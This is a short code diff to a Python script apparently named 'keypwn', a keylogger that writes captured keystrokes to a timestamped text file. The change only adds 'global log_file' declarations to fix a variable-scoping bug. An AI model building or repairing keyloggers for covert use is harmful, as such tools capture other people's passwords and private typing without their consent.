@@ -8,6 +8,7 @@ def get_current_date_time() -> str:
     return datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
 
 def write_to_log_file(key) -> None:
+    global log_file
     keys = str(key)
 
     if keys == "'\\x03'":
@@ -24,6 +25,8 @@ def write_to_log_file(key) -> None:
         log_file.write(keys.replace("'", ""))
 
 def main() -> None:
+    global log_file
+    
     try:
         log_file_name = f'keypwn_{get_current_date_time()}.txt'
         log_file = open(log_file_name, 'w')
